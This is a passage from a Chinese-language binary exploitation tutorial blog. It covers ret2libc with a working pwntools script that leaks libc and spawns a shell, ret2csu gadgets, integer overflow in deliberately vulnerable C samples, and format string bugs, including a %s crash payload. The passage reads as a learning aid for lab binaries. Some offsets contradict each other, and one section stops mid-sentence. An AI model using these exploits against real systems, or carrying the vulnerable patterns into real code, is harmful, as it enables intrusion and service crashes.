Table，过程链接表)</strong><ol><li>GOT：存储着动态链接库的地址。程序第一次调用某个动态链接库函数时，该函数的地址会从GOT中获取。</li><li>PLT：存储着调用动态链接库函数的跳转指令。程序调用函数时，会先执行PLT中的跳转指令，跳转指令会执行GOT中的函数地址。</li><li>原理：攻击者通过程序漏洞（如缓冲区溢出）覆盖某个函数的GOT地址，例如puts函数，使其指向另一个已知函数，如<code>printf</code>。然后再次调用该函数（<code>puts</code>），实际上会执行<code>printf</code>函数，并利用<code>printf</code>函数输出一些信息，例如GOT中存储的<code>__libc_start_main</code>函数的地址。</li><li>获取版本和基地址：攻击者可以使用<code>LibcSearcher</code>库，根据泄露的<code>__libc_start_main</code>函数地址，找到libc库的版本和基地址。</li></ol></li><li><strong>利用<code>__libc_start_main</code>函数的特性：</strong><ol><li><code>__libc_start_main</code>函数在程序启动时被调用，用于初始化libc库。</li><li>这个函数的地址在不同版本的libc库中是不同的，且通常在程序中可以访问到。</li><li>原理：攻击者通过程序漏洞泄露<code>__libc_start_main</code>函数的地址，然后使用LibcSearcher库根据该地址推断出libc库的版本，并计算出libc库的基地址。</li></ol></li><li><strong>利用libc库中的特定结构体或函数：</strong><ol><li>一些版本的libc库中，某些特定的结构体或函数地址是固定的，或者具有可预测的偏移地址。</li><li>原理：攻击者可以利用这些结构体或函数地址，推断出libc库的基地址或版本。</li></ol></li></ol></blockquote><p>用这个脚本有点问题。咱们靠自己，找到<code>__libc_start_main</code>函数的got表地址如下：<img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20241002153641687.png" class="" title="image-20241002153641687"></p><p>puts函数的plt表地址如下：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20241002154836876.png" class="" title="image-20241002154836876"><p>main函数的地址如下：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20241002154436052.png" class="" title="image-20241002154436052"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><span class="hljs-comment">#start_addr = 0x080484D0</span><br>start_addr = <span class="hljs-number">0x08048618</span><br>puts_plt = <span class="hljs-number">0x08048460</span><br>libc_main_addr = <span class="hljs-number">0x0804a024</span><br>payload = flat([<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, puts_plt, start_addr, libc_main_addr])<br>sh.recv()<br>sh.sendline(payload)<br>libc_real_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;real_addr is:&quot;</span> + <span class="hljs-built_in">hex</span>(libc_real_addr))<br>sh.recv()<br>addr_base = libc_real_addr - <span class="hljs-number">0x021560</span><br>system_addr = addr_base + <span class="hljs-number">0x048170</span><br>string_addr = addr_base + <span class="hljs-number">0x1bd0d5</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;system addr is:&quot;</span> + <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;string_addr is:&quot;</span> + <span class="hljs-built_in">hex</span>(string_addr))<br>payload = flat([<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">104</span>, system_addr, <span class="hljs-number">0xdeadbeef</span>,string_addr])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>首先， 能够找到main函数的地址为<code>0x08048618</code>，这个函数作为调用完函数后的返回地址，为了能够发送第二次payload。其次，使用puts函数来打印libc库中的<code>__libc_start_main</code>函数实际地址。因此，栈溢出覆盖的返回地址为puts函数的地址。调用函数前会将当前地址压栈，因此再写入main函数的地址，puts函数接收的参数即为<code>libc_start_main</code>地址。即会将<code>libc_start_main</code>函数在libc库中的实际地址打印出来，实现地址泄露。</p><blockquote><p>这里解释两个问题：</p><ol><li><p>为什么不能将puts函数的GOT表地址作为返回地址？</p><p>GOT表是用来存储函数地址的，而不是代码指令。如果把puts函数的got表地址作为返回地址，程序会尝试跳转到该地址，而GOT表中存储的只是puts函数在libc库中的实际地址，而不是可执行的代码指令。因此程序会崩溃或出现无法预料的行为。</p></li><li><p>为什么给puts函数传入的参数为libc_start_main函数的got表地址，其能打印出实际地址？</p><p>puts函数的功能是将字符串输出到标准输出。将<code>__libc_start_main</code>函数的GOT地址作为参数传递给puts函数时，puts函数会将这个地址解析为一个内存地址，并尝试从这个地址开始读取内容，将其作为字符串输出。而这个got表地址指向<code>__libc_start_main</code>函数在libc库中的实际地址。这个实际地址会随着程序运行时的libc库基地址变化而变化。</p></li></ol></blockquote><p>因此，通过puts函数造成的地址泄露，能获得程序实际运行时libc库中的<code>__libc_start_main</code>函数地址，但是因为每次执行其都会变化，因为程序的基地址在变化。但是相对偏移地址是不会变的。因此，在反复执行exp，打印出<code>__libc_start_main</code>函数在libc库中的地址时，会发现其后三位是不会改变的。这里的后三位为<code>560</code>，那么我们可以通过这个560找到其他函数的偏移地址。这里会借助libc-database这个工具。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">dog@dog:~/Desktop/libc-database$ ./find __libc_start_main 560<br>ubuntu-glibc (libc6_2.35-0ubuntu3.8_i386)<br>ubuntu-glibc (libc6_2.35-0ubuntu3_i386)<br>ubuntu-glibc (libc6-i386_2.35-0ubuntu3.8_amd64)<br>ubuntu-glibc (libc6-i386_2.35-0ubuntu3_amd64)<br>dog@dog:~/Desktop/libc-database$ ./dump libc6_2.35-0ubuntu3.8_i386<br>offset___libc_start_main_ret = 0x21519<br>offset_system = 0x00048170<br>offset_dup2 = 0x0010afb0<br>offset_read = 0x0010a170<br>offset_write = 0x0010a240<br>offset_str_bin_sh = 0x00048170<br></code></pre></td></tr></table></figure><p>可以发现，system的偏移地址为<code>0x00048170</code>，以及bin&#x2F;sh字符串的偏移地址为<code>0x00048170</code>。而<code>__libc_start_main</code>的偏移地址为<code>0x21560</code>。因此我们可以通过得到的libc库中的地址，减去这个偏移地址来获得libc库的基地址。随后，第二个payload覆盖返回地址为libc库中的system地址，参数为bin&#x2F;sh地址。即可获得shell。</p><blockquote><p><strong>这里存在一个问题，为什么padding为104，而不是112呢？</strong></p><p>因为，main()函数是用户代码的入口，针对用户而言；<code>_start</code>函数是系统代码的入口，是程序的真正入口。实际执行过程，会先进入<code>_start</code>函数。如下图：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20241002195535187.png" class="" title="image-20241002195535187"><p>在上述，可以看到一个堆栈平衡（栈对齐）的操作，<code>andesp,0FFFFFFF0h</code>进行堆栈平衡。这个操作即将原本的值变为0，而进入这个函数时其最后一位的值为8，后面变成了0。因此在不进行<code>_start</code>函数而直接进入main函数时，esp的值就比原先大了8，因此栈空间就少了8。所以padding也随之修改成为104</p></blockquote><p>ok~</p><h2 id="中级ROP"><a href="#中级ROP" class="headerlink" title="中级ROP"></a>中级ROP</h2><p>主要使用一些比较巧妙的Gadgets</p><h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。这时候，我们可以利用x64下的<code>__libc_csu_init</code>中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。先来看一下这个函数（当然，不同版本的有一定的区别）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0000000000400592                               ; -------------------------------------------------<br>.text:0000000000400593 90 90 90 90 90 90 90 90 90 90+align 20h<br>.text:00000000004005A0<br>.text:00000000004005A0                               ; =============== S U B R O U T I N E =============<br>.text:00000000004005A0<br>.text:00000000004005A0<br>.text:00000000004005A0                               ; void _libc_csu_init(void)<br>.text:00000000004005A0                               public __libc_csu_init<br>.text:00000000004005A0                               __libc_csu_init proc near  ; DATA XREF: _start+16↑o<br>.text:00000000004005A0<br>.text:00000000004005A0                               var_30= qword ptr -30h<br>.text:00000000004005A0                               var_28= qword ptr -28h<br>.text:00000000004005A0                               var_20= qword ptr -20h<br>.text:00000000004005A0                               var_18= qword ptr -18h<br>.text:00000000004005A0                               var_10= qword ptr -10h<br>.text:00000000004005A0                               var_8= qword ptr -8<br>.text:00000000004005A0<br>.text:00000000004005A0                               ; __unwind &#123;<br>.text:00000000004005A0 48 89 6C 24 D8                mov     [rsp+var_28], rbp<br>.text:00000000004005A5 4C 89 64 24 E0                mov     [rsp+var_20], r12<br>.text:00000000004005AA 48 8D 2D 73 08 20 00          lea     rbp, cs:600E24h<br>.text:00000000004005B1 4C 8D 25 6C 08 20 00          lea     r12, cs:600E24h<br>.text:00000000004005B8 4C 89 6C 24 E8                mov     [rsp+var_18], r13<br>.text:00000000004005BD 4C 89 74 24 F0                mov     [rsp+var_10], r14<br>.text:00000000004005C2 4C 89 7C 24 F8                mov     [rsp+var_8], r15<br>.text:00000000004005C7 48 89 5C 24 D0                mov     [rsp+var_30], rbx<br>.text:00000000004005CC 48 83 EC 38                   sub     rsp, 38h<br>.text:00000000004005D0 4C 29 E5                      sub     rbp, r12<br>.text:00000000004005D3 41 89 FD                      mov     r13d, edi<br>.text:00000000004005D6 49 89 F6                      mov     r14, rsi<br>.text:00000000004005D9 48 C1 FD 03                   sar     rbp, 3<br>.text:00000000004005DD 49 89 D7                      mov     r15, rdx<br>.text:00000000004005E0 E8 1B FE FF FF                call    _init_proc<br>.text:00000000004005E0<br>.text:00000000004005E5 48 85 ED                      test    rbp, rbp<br>.text:00000000004005E8 74 1C                         jz      short loc_400606<br>.text:00000000004005E8<br>.text:00000000004005EA 31 DB                         xor     ebx, ebx<br>.text:00000000004005EC 0F 1F 40 00                   nop     dword ptr [rax+00h]<br>.text:00000000004005EC<br>.text:00000000004005F0<br>.text:00000000004005F0                               loc_4005F0:       ; CODE XREF: __libc_csu_init+64↓j<br>.text:00000000004005F0 4C 89 FA                      mov     rdx, r15<br>.text:00000000004005F3 4C 89 F6                      mov     rsi, r14<br>.text:00000000004005F6 44 89 EF                      mov     edi, r13d<br>.text:00000000004005F9 41 FF 14 DC                   call    qword ptr [r12+rbx*8]<br>.text:00000000004005F9<br>.text:00000000004005FD 48 83 C3 01                   add     rbx, 1<br>.text:0000000000400601 48 39 EB                      cmp     rbx, rbp<br>.text:0000000000400604 75 EA                         jnz     short loc_4005F0<br>.text:0000000000400604<br>.text:0000000000400606<br>.text:0000000000400606                               loc_400606:       ; CODE XREF: __libc_csu_init+48↑j<br>.text:0000000000400606 48 8B 5C 24 08                mov     rbx, [rsp+38h+var_30]<br>.text:000000000040060B 48 8B 6C 24 10                mov     rbp, [rsp+38h+var_28]<br>.text:0000000000400610 4C 8B 64 24 18                mov     r12, [rsp+38h+var_20]<br>.text:0000000000400615 4C 8B 6C 24 20                mov     r13, [rsp+38h+var_18]<br>.text:000000000040061A 4C 8B 74 24 28                mov     r14, [rsp+38h+var_10]<br>.text:000000000040061F 4C 8B 7C 24 30                mov     r15, [rsp+38h+var_8]<br>.text:0000000000400624 48 83 C4 38                   add     rsp, 38h<br>.text:0000000000400628 C3                            retn<br>.text:0000000000400628                               ; &#125; // starts at 4005A0<br>.text:0000000000400628<br>.text:0000000000400628                               __libc_csu_init endp<br>.text:0000000000400628<br>.text:0000000000400628                               ; -------------------------------------------------<br></code></pre></td></tr></table></figure><p>发现一个问题，</p><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>在C语言中，整数的基本数据类型分为short,int,long，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，（因为数据类型的大小范围是编译器决定的，下述默认64位）</p><table><thead><tr><th>类型</th><th>字节</th><th>范围</th></tr></thead><tbody><tr><td>short int</td><td>2bytes (word)</td><td>[0,32767]和[-32768,-1]即[0,0x7fff]和[0x8000,0xffff]</td></tr><tr><td>unsigned short int</td><td>2bytes (word)</td><td>[0,65535] 即 [0,0xffff]</td></tr><tr><td>int</td><td>4bytes (dword)</td><td>[0,2147483647]和[-2147483648,-1]即[0,0x7fffffff]和[0x80000000,0xffffffff]</td></tr><tr><td>unsigned int</td><td>4bytes(dword)</td><td>[0,4294967295]即[0,0xffffffff]</td></tr><tr><td>long int</td><td>8bytes(qword)</td><td>[0,0x7ffffffffffffffff]和[0x8000000000000000,0xffffffffffffffff]</td></tr><tr><td>unsigned long int</td><td>8bytes(qword)</td><td>[0,0xffffffffffffffff]</td></tr></tbody></table><p>当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。</p><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><h4 id="上界溢出"><a href="#上界溢出" class="headerlink" title="上界溢出"></a>上界溢出</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 伪代码<br>short int a;<br>a = a + 1;<br># 对应的汇编<br>movzx eax, word ptr [rbp - 0x1c]<br>add eax, 1<br>mov word ptr [rbp - 0x1c], ax<br># 伪代码<br>unsigned short int b;<br>b = b + 1;<br># 对应的汇编<br>add word ptr [rbp - 0x1a], 1<br></code></pre></td></tr></table></figure><p>上界溢出有两种情况，一种是<code>0x7fff + 1</code>,另一种是<code>0xffff + 1</code></p><p>因为计算机底层指令是不区分有符号和无符号的，数据都以二进制形式存在，编译器层面才对有符号和无符号进行区分，产生不同的汇编指令。</p><p>所以<code>add 0x7fff, 1</code>变成0x8000,这种上界溢出对无符号整型就没有影响，但是在有符号短整型中，<code>0x7fff</code>表示的是<code>32767</code>，但是<code>0x8000</code>表示的是<code>-32768</code>，用数学表达式来表示就是在有符号短整型中<code>32767 + 1 -&gt; -32768</code>。</p><p>第二种情况是<code>add 0xffff, 1</code>，这种情况需要考虑的是第一个操作数。</p><p>比如上面的有符号型加法的汇编代码是<code>add eax, 1</code>，因为<code>eax=0xffff</code>，所以<code>add eax, 1</code>会变成<code>0x10000</code>，但是无符号的汇编代码是对内存进行加法运算<code>add word ptr [rbp - 0x1a], 1</code>会变成<code>0x0000</code>。</p><p>有符号的加法中，虽然<code>eax</code>的结果位<code>0x10000</code>，但是只把<code>ax=0x0000</code>的值存储到了内存中，从结果看和无符号是一样的。</p><p>再从数字层面看看溢出的效果，再有符号的短整型中，<code>oxffff == -1, -1 + 1 == 0</code>，从有符号看这种计算没问题，但是再无符号短整型中，<code>0xffff == 65535,65535+1 == 0</code>。</p><h4 id="下界溢出"><a href="#下界溢出" class="headerlink" title="下界溢出"></a>下界溢出</h4><p>下界溢出的道理和上界溢出一样，在汇编代码中，只是把add替换成了sub。</p><p>第一种是<code>sub 0x0000, 1</code>会变成<code>0xffff</code>，对于有符号来说<code>0 - 1 == -1</code>没问题，但是对于无符号来说就成了<code>0 - 1 == 65535</code>。</p><p>第二种是<code>sub 0x8000,1</code>会变成<code>0x7fff</code>，对于无符号来说是<code>32768 -1 == 32767</code>没问题，但是对于有符号来说就成了<code>-32768 - 1 = 32767</code></p><h3 id="基本示例-1"><a href="#基本示例-1" class="headerlink" title="基本示例"></a>基本示例</h3><h4 id="未限制范围"><a href="#未限制范围" class="headerlink" title="未限制范围"></a>未限制范围</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-type">int</span> data_len;<br>    <span class="hljs-type">int</span> header_len;<br>    <span class="hljs-type">char</span> *buf;<br><br>    header_len = <span class="hljs-number">0x10</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%uld&quot;</span>, &amp;data_len);<br><br>    len = data_len+header_len;<br>    buf = <span class="hljs-built_in">malloc</span>(len);<br>    read(<span class="hljs-number">0</span>, buf, data_len);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>shell如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc test.c</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">./a.out</span><br>-1<br>asdfasfasdfasdfafasfasfasdfasdf<br></code></pre></td></tr></table></figure><p>使用gdb调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">gdb a.out</span><br>► 0x40066d &lt;main+71&gt;    call   malloc@plt &lt;0x400500&gt;<br>        size: 0xf<br></code></pre></td></tr></table></figure><p>由于，环境不同，gcc也不同。因此可能不会出现上述size被覆盖为0xffffffffff</p><h4 id="错误的类型转换"><a href="#错误的类型转换" class="headerlink" title="错误的类型转换"></a>错误的类型转换</h4><p>即使正确的对变量进行约束，也仍然有可能出现整数溢出漏洞，我认为可以概括为错误的类型转换，如果继续细分下去，可以分为：</p><ol><li><p>范围大的变量赋值给范围小的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!n)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;vuln&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OK&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">int</span> a;<br><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;a);<br>    <span class="hljs-keyword">if</span> (a == <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Bad&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        check(a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905121724459.png" class="" title="image-20240905121724459"><p>上述代码是一个范围大的变量（长整型a），传入check函数后变为范围小的变量（整型变量n），造成整数溢出的例子。</p><p>已经长整型的占有8byte的内存空间，而整型只有4byte的内存空间，所以当long 转换成 int，将会造成截断，只把长整型的低4 byte的值传给整型变量。</p><p>在上述例子中就是把<code>long:0x100000000 -&gt; int: 0x00000000 </code></p><p>但是当范围更小的变量就能完全的把值传递给范围更大的变量，而不会造成数据丢失。</p></li><li></li></ol><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><h4 id="格式化字符串函数介绍"><a href="#格式化字符串函数介绍" class="headerlink" title="格式化字符串函数介绍"></a>格式化字符串函数介绍</h4><p>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为人类可读的字符串格式。几乎所有的C&#x2F;C++程序都会利用格式化字符串函数来**输出信息，调试信息，或者处理字符串。**一般来说，格式化字符串在利用的时候主要分为三个部分</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>后续参数，<strong>可选</strong></li></ul><p>printf函数如下图所示：</p><img src="/2024/08/15/二进制安全-基础/image-20240905164004390.png"  alt="image-20240905164004390"  /><h4 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h4><p>常见的格式化字符串函数：</p><ul><li>输入<ul><li>scanf</li></ul></li><li>输出<ul><li>printf</li><li>fprintf</li><li>vprintf</li><li>vfprintf</li><li>sprintf</li><li>snprintf</li><li>vsprintf</li><li>vsnprintf</li><li>setproctitle</li><li>syslog</li><li>err,verr,warn,vwarn等</li></ul></li></ul><h4 id="格式化字符串-1"><a href="#格式化字符串-1" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><p>格式化字符串的格式，其基本格式如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">%<span class="hljs-selector-attr">[parameter]</span><span class="hljs-selector-attr">[flags]</span><span class="hljs-selector-attr">[field width]</span><span class="hljs-selector-attr">[.precision]</span><span class="hljs-selector-attr">[length]</span>type<br></code></pre></td></tr></table></figure><p>以下几个pattern中的对应选择需要重点关注</p><ul><li>parameter<ul><li>n$，获取格式化字符串中的指定参数</li></ul></li><li>flag</li><li>field width<ul><li>输出的最小宽度</li></ul></li><li>precision<ul><li>输出的最大长度4</li></ul></li><li>length，输出的长度<ul><li>hh,输出一个字节</li><li>h，输出一个双字节(word)</li></ul></li><li>type<ul><li>d&#x2F;i,有符号整数</li><li>u，无符号整数</li><li>x&#x2F;X， 16进制unsigned int。 x使用小写字母;X使用大写字母。 如果指定了精度，则输出的数字不足时在左侧补0。默认精度位1。</li><li>o，8进制unsigned int。</li><li>s，输出null结尾字符串，知道精度规定的上限；未指定精度则输出所有字节。</li><li>p， void*型，输出对应变量的值。printf(“%p”,a)用地址的格式打印变量a的值，printf(“%p”,&amp;a)打印变量a所在的地址。</li><li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li><li>%，’%’字面值，不接受仍和flags,width</li></ul></li></ul><p>参数，就是要输出的变量。</p><h4 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h4><p>格式化字符串函数是根据格式化字符串来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。比如说<code>%s</code>表明我们会输出一个字符串参数。</p><p>以下图为例介绍</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905165034945.png" class="" title="image-20240905165034945"><p>在进入printf函数的之前（即还没有调用printf），栈上的布局由高地址到低地址依次如下</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mel">some value<br><span class="hljs-number">3.14</span><br><span class="hljs-number">123456</span><br>addr of <span class="hljs-string">&quot;red&quot;</span><br>addr of <span class="hljs-keyword">format</span> <span class="hljs-keyword">string</span>: Color %s, Number %d, Float %4<span class="hljs-number">.2</span>f<br></code></pre></td></tr></table></figure><p>在进入printf之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p><ul><li>当前字符不是%，直接输出到相应标准输出</li><li>当前字符是%，继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是%，输出%</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>那么printf函数写成如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure><p>此时，可以发现没有给printf提供参数，程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为：</p><ul><li>解析其地址对应的字符串</li><li>解析其内容对应的整型值</li><li>解析其内容对应的浮点值</li></ul><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>格式化字符串漏洞的两个利用手段</p><ul><li>使程序崩溃，因为%s对应的参数地址不合法的概率比较大。</li><li>查看进程内容，根据%d, %f输出栈上的内容。</li></ul><h4 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h4><p>通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们只需要输入若干个%s即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">%s%s%s%s%s%s%s%s%s%s%s%s%s%s<br></code></pre></td></tr></table></figure><p>这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身似乎不能控制程序，但是这样可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。</p><h4 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h4><p>利用格式化字符串漏洞，可以获取所想要输出的内容。一般会有如下几种操作</p><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用GOT表得到libc函数地址，进而获取libc，进而获取其他libc函数地址</li><li>盲打，dump整个程序，获取有用信息</li></ul></li></ul><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>例如，给定如下程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 